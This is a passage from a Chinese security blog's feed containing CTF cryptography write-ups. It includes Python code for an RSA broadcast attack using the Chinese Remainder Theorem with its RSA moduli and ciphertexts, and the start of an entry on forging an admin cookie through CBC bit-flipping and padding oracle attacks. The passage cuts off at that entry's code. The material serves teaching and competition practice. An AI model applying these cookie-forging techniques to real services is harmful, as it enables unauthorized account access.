class="number">1857569191277</span><span class="number">1680281996220</span><span class="number">73434303881</span><span class="number">60650608047</span><span class="number">149901674641</span><span class="number">2080104548734</span><span class="number">66609600454</span><span class="number">04468358647</span><span class="number">98441305645</span><span class="number">25332317252829</span><span class="number">66995443643</span><span class="number">74224301907100</span><span class="number">902133937804</span><span class="number">35449488077</span><span class="number">84381630002</span><span class="number">772853108404</span><span class="number">762253870836</span><span class="number">5772411064244</span><span class="number">675667055162</span><span class="number">90766082076</span><span class="number">84339072827</span><span class="number">490954580153</span><span class="number">41570802297</span><span class="number">55928799044</span><span class="number">049606505148</span><span class="number">697012729101</span><span class="number">54359061433</span><span class="number">28670495764</span><span class="number">97979831739</span><span class="number">02254055872</span><span class="number">70445353337</span><span class="number">08749778030</span><span class="number">066678452175</span><span class="number">75596777645</span><span class="number">04161208852</span><span class="number">136474658460</span><span class="number">01870344471</span><span class="number">86804263093</span><span class="number">1549788762235</span><span class="number">47956985675</span><span class="number">55861658547</span><span class="number">81140334046</span><span class="number">75467240285</span><span class="number">779109035581</span><span class="number">87895025517</span>,</span><br><span class="line">]</span><br><span class="line">C = [</span><br><span class="line"><span class="number">0x36a66571</span>751faf3bbf6ad760adbcd1be123d2ab526d2fbf6697ec38c7d4ee<span class="number">7d709d8</span>ab<span class="number">3f154092410</span>f46ae18ac75aa32ec<span class="number">9393a98385</span>cd8d8df3b5a15eeccb<span class="number">2637b353</span>f6808fd39e11faf2b742eb<span class="number">0597f8e7</span>a<span class="number">977196171b03</span><span class="number">1c076140</span>cb<span class="number">05c771d8</span>df<span class="number">2f81d8b90</span>4e8bf579da0e568fa<span class="number">67d0a94a76</span><span class="number">07a002c45</span>6824e7ea71df<span class="number">895f1967</span>b12ac36eade287589fd<span class="number">556c71520</span>d2dfdb1a8663dcae615cc40be1ff82ae42ae617db75bb1dd88235fd<span class="number">698b53921</span>a42fa<span class="number">6390854</span>eb<span class="number">1393d2434158</span>2ce83bd690ea12d2697bc<span class="number">929a77b51</span>adb04131baee<span class="number">52050340</span>be9a2be6eaf<span class="number">795b6877</span>bcc22d5d8cce<span class="number">3829485340</span>b641585ba3ad<span class="number">169850e78056</span>2467fbfb<span class="number">09f4f5235</span>,</span><br><span class="line">0x51bd<span class="number">5b18e527</span>dc109cd<span class="number">202f39841</span>bb39422dcc<span class="number">1f566f59</span>da<span class="number">4c623d71</span>66730dded<span class="number">90963c825</span>ba6300c0dab<span class="number">181f69f12</span>ba<span class="number">40955e68e60</span>40f794ee642aa26acf437ce382a0ebdae<span class="number">8d3c77398</span>a01f55eb<span class="number">2593d243e99</span><span class="number">1427197f6166</span>b117e8bdfa<span class="number">3164d99e57</span><span class="number">13f18d64947</span>c36afba<span class="number">69d0c9208</span>e79815af20cb4dd201bfcacd485e8cc98cbeee<span class="number">1b75d6d2</span>b1ad<span class="number">81276647b6</span>f7b2137cd9ff<span class="number">9e2594b9</span>ec8952fc2d184ba69e8a17fa5dc<span class="number">865b6e96</span><span class="number">552d81750</span>e85ef427ad184b2efc5534fb<span class="number">6f70f8d09</span>6b3029dd<span class="number">71349b571</span>fa1997fd<span class="number">14002625</span>cbea<span class="number">894811c7</span>bf8f582dba0ec9d03edbf<span class="number">25517179</span>bb<span class="number">7f20288</span>cc2e2ab<span class="number">0b038185</span>ac<span class="number">525e891</span>c<span class="number">15c151d47a148</span>86f947,</span><br><span class="line">0x8df94ca<span class="number">10d136659</span>aab<span class="number">94677d58261</span>84addcef8cc<span class="number">56300982251</span><span class="number">9b157c368</span>d<span class="number">17434b9b6</span>fa08ad<span class="number">783003d0</span>aafc<span class="number">6370938e6</span>c<span class="number">795d93968</span>cf094260ef<span class="number">05f1f65b03</span>be9aef<span class="number">4d0e8b4</span>e5ef8bf<span class="number">9182e382</span>b08a38c04bb448097eb1ee93bd9ddd6abe<span class="number">39f2f356</span>ffae<span class="number">8470f7d63</span>edea<span class="number">2c87b7b77</span><span class="number">66c57e24086</span>f<span class="number">59825f5f50</span>d5ed7443adfb26dd3bbdf662cbf<span class="number">082a9415</span>b<span class="number">73a8c81581</span><span class="number">272a4b8</span>f75f656ec<span class="number">03370e53</span>fc<span class="number">88382e842</span>a<span class="number">75f329c51</span>0aa09c647afde2fcee<span class="number">7a5924806</span>a4f7b57cb0ed769c4db<span class="number">41f35e48c58</span>12fd<span class="number">75315697e93</span>6fdeacd<span class="number">366c851</span>e<span class="number">06b30050</span>cd<span class="number">93205c4</span>fb<span class="number">233233990</span>fc<span class="number">2b5a0c9</span>cd2aee58209fc<span class="number">04c6e782</span>f2639d51fb<span class="number">43d7952b2</span>f8afc1a4403,</span><br><span class="line">0xbe<span class="number">73713e7928</span>b1970d6dd<span class="number">531e0c9</span>a6a3884bef<span class="number">82c3a39a04</span><span class="number">3f226e88</span>cfe54a3dc<span class="number">28c51589346</span><span class="number">3e1039a14</span>e<span class="number">49c8d27154</span><span class="number">544f9f3</span>f8ff<span class="number">4d750b56</span>ad41ef<span class="number">3c5b1710</span>e<span class="number">889a4d88</span><span class="number">45722c6588</span>f51f2bf<span class="number">601a0b81</span>6489b6afa<span class="number">23e909d42</span><span class="number">01b570788</span>e0cae3ab521ae2ae<span class="number">507a02a5</span>af<span class="number">46036c49645</span>9bc<span class="number">86f34a141</span>fad<span class="number">1802d578</span>c<span class="number">645164b5c0</span>fb<span class="number">91978b07</span>efdb<span class="number">8b9036028</span>d4ea21b4719eae9caf6247daa<span class="number">9c9639f7</span>b<span class="number">79521c7</span>feaf<span class="number">1e9b22852</span>f<span class="number">32f91f93631</span>e03eb<span class="number">7c091d3</span>ae27858faea<span class="number">04481a1404</span>c<span class="number">543b13c9</span>ffef<span class="number">06326d7d6</span>f67db<span class="number">7f05f91611</span>a3d185fb6fc1e1fb<span class="number">07b01c83e46</span>c<span class="number">84495a252</span>ba4eb0aa3a148ca4b6dc61492eb71e3b5bf<span class="number">7473595</span>ed69841ce0b94,</span><br><span class="line"><span class="number">0x321516</span>de<span class="number">98f8d6584</span>adb<span class="number">01d5783d13</span>cee2daf<span class="number">74f2285c69</span>3debe<span class="number">3a264c0</span>b<span class="number">9a637b42</span>c<span class="number">17a61a3870</span>c70acdfdcbb3ebe49fb<span class="number">57c40079d4</span>f82fe<span class="number">4051b53745</span>45562baa12d894baa<span class="number">66016c4d02</span>5ace559bd<span class="number">7b5d658</span>d70e0e7db<span class="number">5a24a212a48</span>a5e9ba44dc<span class="number">091c4846</span>f60509fe00b780db6101b73cfc2492be2e75bf<span class="number">9e82b727</span>ab6b459df<span class="number">8280e83e59</span><span class="number">119795a82</span>acd53e982fa3ad82ab<span class="number">80a4213728</span>c<span class="number">41808d53</span>cc<span class="number">75e2a1980194</span>3ff1af19e85aaffb<span class="number">1b29a41c0</span>af54ca<span class="number">44335d61171</span>3e5ec6ff38675de8704fa2ddaad90b50cf<span class="number">4553174a9</span>ae7fd61e72c5cc8a77df<span class="number">159a21d67539</span>e92ff702ddef11c91eb<span class="number">39c247355426</span>f22f87de<span class="number">33f8d65e55</span><span class="number">89553405f50</span>a78c84,</span><br><span class="line">0x52cc422ae<span class="number">1012a854</span>e<span class="number">0d29b9b1</span>da6e68ef3a3fa<span class="number">6b8d7551</span>c<span class="number">1c664875</span>e<span class="number">2771494112442</span>79eddcf9656fe182c4bfadb<span class="number">33d2d917</span>e7faa<span class="number">580c517</span>d<span class="number">7960e99348</span><span class="number">13185331e9</span>c9fa3698fa9de3f8aad<span class="number">5786249</span>fc0505db05f01c43dc0dac<span class="number">422c51114</span>aabc<span class="number">5d0451a92</span><span class="number">1e36e47d9</span>c<span class="number">4654574076</span>dc04d2778ff9bcaa7ed3be2432bb<span class="number">515c472101</span><span class="number">3d98a569</span>b794cf027ab9e356dde48fd<span class="number">06287f78982</span>fac010e5abee0aa<span class="number">71388f270</span>f<span class="number">70c53f0f1</span>ac091fdbbe<span class="number">380c1e67</span>e<span class="number">1079a2a6</span>ea7ae6f2173fd<span class="number">1c39994e44</span>36ad<span class="number">058996b0</span>eed5cbc2ef<span class="number">10e4e6c81</span>4fad<span class="number">9b62056d77</span>01976ce88fff49e864ca23b6ff<span class="number">762168436f7</span>aaf0ce379515fd<span class="number">0d4d97367</span>c0cf8ce7242fe6809cb,</span><br><span class="line"><span class="number">0x7a4c0</span>c06b31aa9be92dfcc10af<span class="number">0b4d99429</span>bd<span class="number">0d2465d43</span>c<span class="number">56e7488136</span>db<span class="number">91347f7e40</span><span class="number">213e82b5</span>bbcafee<span class="number">449614d9</span>c26237dcf6ae<span class="number">1118f345</span>d<span class="number">5f76a7b7</span>fd<span class="number">665146103c4</span>ba9cf<span class="number">63444363631</span>b<span class="number">2e847a9</span>ecd<span class="number">6126931299</span>c<span class="number">30a31582d0</span>fe<span class="number">918e71251</span>d80bb<span class="number">7b3a3c27</span><span class="number">833379d12</span>ca45fb<span class="number">339b169340</span>335af<span class="number">84131a8848</span>c7ac<span class="number">56533964823</span>ebc1cc78dc<span class="number">69f136e735</span>a46b9af<span class="number">5123b31171</span>ff<span class="number">27e71f7f11</span>e<span class="number">25878451619</span>c<span class="number">199b04a93414</span>effb74e90effd<span class="number">91a24735a77</span>d<span class="number">3364020</span>ae38883addac<span class="number">5c7f71e6</span>a<span class="number">0e57d82d47</span>c<span class="number">255c172f084</span>a707ea565daa<span class="number">9d121693</span>ae94391fa4c0fa0e3ad<span class="number">877b030144</span>69bda192aebe3e4cf8fcc<span class="number">8469636</span>ed<span class="number">8a74659</span>cb4db0e8e5eecd9a,</span><br><span class="line">0x3fc<span class="number">5f6519c72</span>0d08da16c2df2112ba<span class="number">76d718329</span>a8a8cdcace3bc<span class="number">2b07d603</span>cad7e492ce13ce537bddef922ee8fabf8261a27dbc0ca<span class="number">94752a2</span>fe<span class="number">8016b99088</span>a4cf794126da4673e7cea<span class="number">14428a7f3</span>bb<span class="number">2a50f489</span>d<span class="number">0a507b3</span>fb<span class="number">3c6541f4</span>d<span class="number">25941558180</span>e28db6938fd<span class="number">6e92856</span>ba<span class="number">10e56d2100</span>f0d12fe6dd64e8d75ff5ad<span class="number">91f446b04</span>81412ab10d08df34cdb7213df180cfa342e38af<span class="number">893750c9</span>df<span class="number">36987f63008</span><span class="number">3985588b77</span>58cb<span class="number">3b83559485</span>f208ac5b8c2df<span class="number">81379b69565</span>adae0ce38ffbe568715cca<span class="number">87381d72508</span>bc<span class="number">278e374</span>acfb0b9db<span class="number">4726630</span>dfdb6771ac3de26c0ec48ce72cec92af<span class="number">4d610f31</span><span class="number">2474d979</span>d7a445cd0aa16d9bfb<span class="number">8c8434449</span>aacf9ea3acd23653,</span><br><span class="line">0x6db31ce529ff<span class="number">59c5e2a06</span>cee7c7ff<span class="number">63b26b5297</span>a359c87edd<span class="number">61d144285a99</span>cb<span class="number">22a311a75</span>dbe<span class="number">8d5a1a7</span>fdcc8eef<span class="number">52a4a1126</span>ef<span class="number">2e09a38b1</span>f5e17ee<span class="number">0c0c1d80</span>2e4ff2179ad<span class="number">66336613</span>ca539d1ea<span class="number">76144e832</span>b8faf<span class="number">7f9f09d0</span>b<span class="number">061a8c70</span>e<span class="number">13173037</span>ef<span class="number">1255941</span>deae9942a8bee684c46df73fde2ba15bd<span class="number">925255f61</span>ce<span class="number">3f47480603</span><span class="number">88b572e91</span><span class="number">4f2e8a70</span><span class="number">68f026550</span>fb06f283dee852a44ce<span class="number">9d80e572</span>a<span class="number">9a9c84a26</span>d<span class="number">9f35308907</span>ad995bd4bb<span class="number">29893e23b72</span><span class="number">5611c39676</span>cdd9bd953ec<span class="number">2b988d234</span><span class="number">4d95c96a5</span>cf3f9daf9449ee3e57abad<span class="number">421038d33</span>a14ab9eaa91421cce<span class="number">008c2b7</span>a<span class="number">49085e555</span>fde<span class="number">59a07e4c0</span>bb3da1a487bef263608cf9001c2cb<span class="number">3a0f128f8</span>ffdc4b5,</span><br><span class="line">0x47fc4dec774af<span class="number">58a10a86f32</span>aca<span class="number">278b7333</span>e<span class="number">2a203f32d1</span>c3829f77ee1ca4bb<span class="number">26967d46f250</span>1ebf<span class="number">00f1b7d183</span>245ae<span class="number">9230c27a1</span>b<span class="number">44e77b943</span>e<span class="number">6b666c1</span>eb<span class="number">93d77c400</span>accd3be53637cfcdf42617ec7e49ad<span class="number">7466e779</span>ff1deeb<span class="number">26d055a40</span>d<span class="number">4028845e07</span>225acd<span class="number">900a158e32</span><span class="number">64301f3f47</span>4db<span class="number">2d185f18c71</span>78eb6bb22af198527bf714ca<span class="number">70e4b1b87</span><span class="number">86595e59</span>db<span class="number">4a1e7666</span>d4f11aab6d8b8cdf92d25fe<span class="number">1371853</span>bc191223dfa1e3a1eb0ddc139b23bdaa<span class="number">34b7b628</span>c<span class="number">42075291168</span>9bd<span class="number">2360355e09</span>91e7824ec91fa5a16a04bcdb<span class="number">20b21859c210</span><span class="number">1187c5901</span>fd<span class="number">83c33842d66</span>accae<span class="number">05e9f8d52</span><span class="number">390245d154c6</span>f6fd70cc9df06a7cb6beb<span class="number">8e97158</span>dd<span class="number">008b289</span>cc298b5be,</span><br><span class="line"><span class="number">0x3879320</span>d<span class="number">2b72a7d47</span><span class="number">6f911a62</span>1a2cde56cb4f11bf<span class="number">6f2092a1</span>d<span class="number">0e37732e39</span>587ea5c8cc<span class="number">8012b86531</span>5823bb<span class="number">095513e0</span>aaebf00a1d0bc64ffec621ba<span class="number">88574893741</span>d<span class="number">16a051962</span>eb48e6ce7a7bcd<span class="number">1c200b93d43</span>de4b913fa04a33aa6ecf1cbe<span class="number">8b6224f86</span>acb6fc<span class="number">30e3c98092</span><span class="number">65e94e89f5</span>d<span class="number">9e86149263</span>ab<span class="number">1e094e47</span>a<span class="number">3b5a11402</span>daad15f1af9f4af6ac6fb<span class="number">5042e46c16</span>b5cd<span class="number">0339c07311</span>bfbc<span class="number">12f5c55d56</span><span class="number">575d340</span>fe3409fc0cdc53c70ef188de0fa<span class="number">5361f964</span>e3dda4cfa93e4c1dcc<span class="number">2899b54405</span>ab<span class="number">1a86377</span>cbd<span class="number">52c804c8</span>abe1801fb58e07cb4c12ccc7dae2d5fdcd<span class="number">99e7e0b41</span><span class="number">455a211b41</span>8d7d23eec52ab5964a9cf8e4dd644db<span class="number">1643b23162</span>a84acd<span class="number">394315f26</span>,</span><br><span class="line"><span class="number">0x3744c133</span>e79ad<span class="number">8c24d42c184</span>ef<span class="number">789b2e8</span>f<span class="number">98a436413</span>a<span class="number">1759a3d38</span>77a7be<span class="number">779d20237</span>ca9f8795da<span class="number">75101b58f67</span>a5cfe<span class="number">3862c09381</span>b<span class="number">90541f9744</span>b<span class="number">48d0c181d77</span><span class="number">238e30c5</span>ff<span class="number">3c17b7d61</span>cad<span class="number">61375028a9</span>f5df2ba8ba<span class="number">4b03149932</span>aee<span class="number">7e44a225c08</span><span class="number">61e6544a1</span>fdf<span class="number">6c9c76f6</span>a<span class="number">3e82d585</span>f82ea9f5db<span class="number">917742d05</span>7a6f1cd<span class="number">05173e125f98</span>d10e938cb<span class="number">4a81d963</span>adfd<span class="number">557a4341</span>e361f0ad258cf<span class="number">0898a2f129</span>e84ecb<span class="number">010006f72</span>c56e23d49af<span class="number">995a0c36</span>27c37cd<span class="number">94b4f60583</span><span class="number">4a31297e81</span>0ab5edeca323a7ab<span class="number">1a557376</span>cc<span class="number">363918b8</span>fab2391afc2d6fc<span class="number">835d68530</span>aea668e3fa5fad<span class="number">2a820289</span>b2c69fca<span class="number">87b9864b70</span>55aaede<span class="number">02973866580</span><span class="number">7a1234c34</span>38b6df<span class="number">933b5011</span>,</span><br><span class="line">0x80e66bec<span class="number">156f4f23</span>de<span class="number">053a26b43</span><span class="number">1b5c9403</span>b<span class="number">866b9e3</span>db1bff70294fa<span class="number">02b9e2b190</span><span class="number">784b2c00</span>a80b8ca68ada<span class="number">1a346901</span>b<span class="number">23a18e64e2</span>e72af<span class="number">65e692b68</span><span class="number">2c63104e187</span>05ed660c5bb8a7dc92210dd6b39c9da4ff6dbead8275cda<span class="number">95137e35b82</span><span class="number">7257077089</span>a3b3943cb25475db<span class="number">403246547328</span>d026bf1ae<span class="number">84c0945d4</span>eac<span class="number">09a5b19f3</span>d876fc8a7634db<span class="number">369366d98</span><span class="number">90794a8420</span>b<span class="number">7f68993176</span>d4ed<span class="number">5b8898b91</span>62220fba<span class="number">24400437</span>af66f5272ae76903af<span class="number">9f20c6e73</span>d64d6d90fb<span class="number">93423a87328</span><span class="number">83e3f1a73</span>c<span class="number">49865026a51</span>79ced<span class="number">111c830a96</span><span class="number">0444a1000</span>c6e3aaf<span class="number">2d73093979</span>507ac2f8bd44dd<span class="number">3977d27f90</span><span class="number">92934d43</span>daa7f2054cef40858fcdc4caf<span class="number">9d60b2a93</span>0dc9882,</span><br><span class="line"><span class="number">0x32519d4</span>dcbe20762cd<span class="number">311f137403</span>d<span class="number">55f2991779</span>a<span class="number">869854303</span>a<span class="number">92937f1c0</span>ac2b3c8de<span class="number">9462335</span>fbdfcfc<span class="number">80a2d49952</span>036fcc<span class="number">3892599846</span>b17f6becf6623db<span class="number">795c9f1</span>ad6ed43f65de285bb<span class="number">12050f3f81</span>eaa<span class="number">31c7b34e3</span>b<span class="number">748d87d4</span>b<span class="number">4d9789844</span>d<span class="number">1c739c7</span>c5cc<span class="number">1493b23e32</span>953e64bf2fbf2ca403827bc<span class="number">8e23b428</span>f<span class="number">306c0e50</span>72d89bb<span class="number">601e66706</span>af21acb54da8bb5a535ce<span class="number">755028b1</span>a59be3682bdd9b8cff60a36ab486361faf68cde5acf1fe590d2fe8fcd130d0de<span class="number">485f172854</span>a<span class="number">02e53b4d80</span>bb223ee41d1bed624fe7ac<span class="number">2579f329</span>a48de2486de<span class="number">9d19a02328</span>78ce2bfd<span class="number">7b203c4234</span>ab7fd28bd5086c1aec9cfa<span class="number">27653b1742</span>ad2bdcdb82df242ef<span class="number">6c3e5330</span>e4955d,</span><br><span class="line"><span class="number">0x4e4196</span>a<span class="number">7b0c663</span>ed59ad6674fd<span class="number">59f2a26f9</span>e48e10fcc360d78cb35b5dd<span class="number">641402b32</span>a<span class="number">39e828925</span>b0155eb<span class="number">9f814e88</span>bb5ff36cc0def7dd35d3aed<span class="number">96234507b00</span><span class="number">7f0a0c14</span>d<span class="number">477d2f09</span>dee<span class="number">9f67c58787</span><span class="number">7202d8815</span>c<span class="number">424a14f54</span>b<span class="number">5a19f48f1</span>e939ad16b67fa<span class="number">481d960173</span>4ae7e52bba<span class="number">9c5f54f70</span><span class="number">3992d4a94</span>b3bc<span class="number">3f3c7e25</span>a35dcb51ba8b7fc45dea644262be<span class="number">00037724a09</span>c46d0bac<span class="number">70c43555e37</span><span class="number">332c35a199</span>707c0cdb8bc1da<span class="number">5a97085d07</span><span class="number">3400e1797</span>c<span class="number">36c726d89</span><span class="number">4819154a6</span>fb<span class="number">6f690c1</span>aecc713b90aa5fe551fa<span class="number">56641d967</span>d<span class="number">162332d10</span>ecd267adf4cd5e90d2df6e0aa52ca1dc<span class="number">59f868719</span>b<span class="number">76e309c59</span><span class="number">877b193018</span>b8ce9ab<span class="number">50248c4a0</span>c5dad<span class="number">1a30f5614</span>a5804,</span><br><span class="line"><span class="number">0x299118</span>bc<span class="number">357f5e54</span><span class="number">6d46209</span>bb<span class="number">096684e33</span>6ee<span class="number">29225c2a214</span><span class="number">537d3a0</span>e<span class="number">0368537e0</span>dfd<span class="number">6780c2890</span>ef<span class="number">87766679e56</span><span class="number">7e388205e34</span>f9cb548afdae574ccae<span class="number">43367e406</span>affc<span class="number">253912972d0</span>f0af7911b0ea9918d80aee<span class="number">4c17e9c211</span>10805fe1bda963cd<span class="number">50c8d58c6</span>a<span class="number">55597195c43</span><span class="number">5b2d923</span>dae945b88baa962bf7ad05fceee1604c29ee<span class="number">27e85d43a5</span>dd0725fbdd721129fda99ff<span class="number">175e9e6e72</span>7cfd<span class="number">5e33827f0</span>d<span class="number">0287b950</span>d<span class="number">3866d7b70</span>f<span class="number">31788127499</span><span class="number">096b5c106</span>7daff65de<span class="number">5c5a0a8</span>f4ab<span class="number">07c75650e222</span>cefe<span class="number">605159f37f57</span><span class="number">217f5d38521</span>bdee<span class="number">12a1513f75</span>c<span class="number">68963597444</span>ebf33af<span class="number">268e91c53</span>17329fc<span class="number">51f29806c2</span>ad8bdcf1eb<span class="number">46d012258119</span>f4dc23ef<span class="number">8e20c2f10</span>e1a,</span><br><span class="line">0xac<span class="number">28242337642</span>cabf<span class="number">950162a965</span>ab<span class="number">69d9f2e28</span>58e732cb0c97bfeecbc965670dacda76edb<span class="number">6e591e07</span>bab71eef52d1ee<span class="number">4e857c8</span>f<span class="number">30682451d5</span>c<span class="number">3b325b185</span>f<span class="number">3a3b5e4</span>d1eb<span class="number">539d94e134</span>a<span class="number">5792c646</span>f<span class="number">60552a87970</span><span class="number">549c01514</span>b9e2af63e2dadedfa<span class="number">9f732f3</span>d71ed6301ce<span class="number">54a35e01e5</span>d90bb0cc<span class="number">106b8c2833</span>eeacbbab60ab<span class="number">362a87e7</span>e8435ebef01b7f6aa509c09ac44d7ff8da<span class="number">06b3a04103</span>db2f8928ed04ab838291db8badd<span class="number">859c9b65</span>774dded6269a56fd3eb10cc7d1cb6bd737bfcf<span class="number">65e533245657</span>a<span class="number">2c69710318</span>f<span class="number">83b4543713</span>c<span class="number">3c41843634</span>2823afd<span class="number">996b10c8</span>d<span class="number">77c2e2a118</span>d4fb1ecbd<span class="number">1b1f16d67</span><span class="number">5292669d8</span>bccaf86f6c1af<span class="number">02e5f7f9</span>ee5c7aeb<span class="number">81c8a111</span>fe,</span><br><span class="line"><span class="number">0x19d171</span>bf0005dc<span class="number">1f4d11f80</span>d<span class="number">598687610</span>cc<span class="number">6c062a1</span>d2ace<span class="number">2b2e835</span>f528117df7ccc873553bc<span class="number">413b603</span>c<span class="number">1605335</span>bf5d2cf<span class="number">656e804</span>d39e6ede<span class="number">8c8b4a43</span>014db17aa31aafa<span class="number">9998028a2</span>e87b32d3ec35fd<span class="number">16836c133d80</span>f88a8af86fc7d6fa01540ddfb<span class="number">78615a11f143</span>293d4df<span class="number">73307041d8</span>bd28f186bdc099685ed324abac<span class="number">7980680d86</span><span class="number">261259a66</span><span class="number">6c64c4c5</span>a0dabdaf01e3700dc<span class="number">4e70a74d38</span>69572ce03a9c4dec97edfb<span class="number">04771907</span>bda0683fe<span class="number">189c3d0e200</span><span class="number">2352a6c5</span>f85bf<span class="number">7455e5717</span>c7cc9ae<span class="number">13217a0</span>ea<span class="number">04c933837</span>a<span class="number">48e3b356151</span>bdae<span class="number">1004b9828</span>d<span class="number">68e03736</span>cf8fad<span class="number">63d74e87785</span><span class="number">19b5c3f13</span>ef5fc31ab85c11ab4fc8396def7bc<span class="number">6f690675</span>c30fbcbeb86f93,</span><br><span class="line">0x3d81bd9c0aa88eb6bafec<span class="number">40e4198f2</span>c<span class="number">55d56575914</span>d1a7aa81dfb<span class="number">0256b9429</span>f7bcf5a3c7ec<span class="number">01a098a0</span>af<span class="number">98e016b02</span>2bec<span class="number">1d035b9</span>f<span class="number">9630938294</span>d<span class="number">3d092328</span>c<span class="number">35f7572c6</span>a<span class="number">8d1c9851</span>ca<span class="number">766c85e4</span>ab<span class="number">676330e7</span>ec1f9f4baa90ca6e5ea3ec024d6af4fcc<span class="number">5f51872037</span>afeceffad<span class="number">441e445155</span>ab8082ff<span class="number">5e0b0291</span>c79ca7ede868a52facfc555ba22b2c75bb<span class="number">2571f3c79</span><span class="number">16655b9f29</span><span class="number">5a4d87a1</span>cfb<span class="number">554677d64</span>6ff813dc<span class="number">59f009345</span>e0a94cbd<span class="number">2075094386</span>c9f10b6aefa28cd<span class="number">3194d3426</span>e10718fea4e3bcb5d1acf6cbe<span class="number">4e586d6</span>bd<span class="number">7332d38f4</span>c<span class="number">53499d80f02</span><span class="number">6166422e15</span>d4ed<span class="number">8e26584242</span><span class="number">3252613b54</span><span class="number">7f8e574</span>c7194c12dd91ef<span class="number">51d31a6671</span>d62ecf<span class="number">8a558d47</span>b1eb6</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># Calculate N</span><br><span class="line">N = 1</span><br><span class="line">for x in n:</span><br><span class="line">    N *= x</span><br><span class="line"># Nx = N/nx</span><br><span class="line"></span><br><span class="line">Nx = []</span><br><span class="line">for x in n:</span><br><span class="line">    Nx.append(N/x)</span><br><span class="line"></span><br><span class="line"># Dx = invert(Nx, nx)</span><br><span class="line">Dx = []</span><br><span class="line">for x in xrange(19):</span><br><span class="line">    Dx.append(long(invert(Nx[x], n[x])))</span><br><span class="line"></span><br><span class="line">X = 0</span><br><span class="line">for x in xrange(19):</span><br><span class="line">    X += C[x]*Nx[x]*Dx[x]</span><br><span class="line"></span><br><span class="line">M_19 = X % N</span><br><span class="line">print M_19</span><br></pre></td></tr></table></figure></p>
<p>求出的M_19为$m^{19}$，把M_19开19次方就得到明文.</p>
<p>在这再扯下中国剩余定理，上次写的有点笼统，这次总结一下：</p>
<p>已知 $M^n\ mod\ N_n = C_n$，需要有n条这样的实例，就能求出$M^n$</p>
<p>假设n = 4，然后已知<br>$$\begin{cases}<br>M^4\ mod\ N_1 = C_1\\<br>M^4\ mod\ N_2 = C_2\\<br>M^4\ mod\ N_3 = C_3\\<br>M^4\ mod\ N_4 = C_4\\<br>\end{cases}$$</p>
<p>M为我们需要求的数，$N_1, N_2, N_3, N_4, C_1, C_2, C_3, C_4$为已知，这样我们就可以通过中国剩余定理求出$M^4$</p>
<ol>
<li>求出$N(N = N_1 * N_2 * N_3 * N_4)$</li>
<li>求出$NN_n(NN_n = N / N_n)$，比如$NN_1 = N / N_1$</li>
<li>求出$D_n(D_n * NN_n = 1\ (mod\ N) )$，比如$D_1 * NN_1 = 1\ (mod\ N)$</li>
<li>求出$M^4$，$M^4 = (C_1*NN_1*D_1 + C_2*NN_2*D_2 + C_3 * NN_3 * D_3 + C_4 * NN_4 * D_4)\ mod\ N$</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>本次SCTF的密码学是简单的RSA套餐，涵盖了6种RSA的攻击方法<br>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
    
      <category term="Crypto" scheme="http://0x48.pw/tags/Crypto/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[GGCTF的对称密码学]]></title>
    <link href="http://0x48.pw/2016/05/03/0x1A/"/>
    <id>http://0x48.pw/2016/05/03/0x1A/</id>
    <published>2016-05-03T14:00:51.000Z</published>
    <updated>2016-05-04T03:12:56.565Z</updated>
    <content type="html"><![CDATA[<p>研究了GGCTF中的两题密码学，用到了SHA1 Length Extension Attack &amp;&amp; CBC Padding Oracle Attack<br><a id="more"></a><br>最近中了密码学的毒，研究完非对称，又来看对称密码学了(数学虐我千百遍，我待数学如初恋)，这两种对称密码的攻击方法在《白帽子讲web安全》中也都有详写</p>
<p>这两题也算了一个系列的了</p>
<h1 id="Eucalypt_Forest">Eucalypt Forest</h1><blockquote>
<p>Can you find any weaknesses in the use of the encryption keys?<br>Head over to eucalypt-forest.ctfcompetition.com</p>
</blockquote>
<p>这题需要你构造出<code>{&quot;username&quot;: &quot;admin&quot;}</code>, 只需要利用比特反转就行了，比如，我注册一个<code>aamin</code>, 最后进行加密的字符串是<code>{&quot;username&quot;: &quot;aamin&quot;}+\x0b * 11</code>, 返回的cookie中包含了16位的IV，和32位的加密密文，因为使用的是CBC模式，所以我们可以通过修改IV来修改解密后前16位明文，通过修改最后一位IV， 我们能把<code>a</code> -&gt; <code>d</code>, 导致最后解密cookie得到的明文是<code>{&quot;username&quot;: &quot;admin&quot;}</code>，GETFLAG</p>
<p>仅仅利用比特反转有局限性，只能任意修改前16位明文，不过再加上Padding Oracle Attack, 那么就可以伪造任意明文了，Talk is cheap, show you the code.</p>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 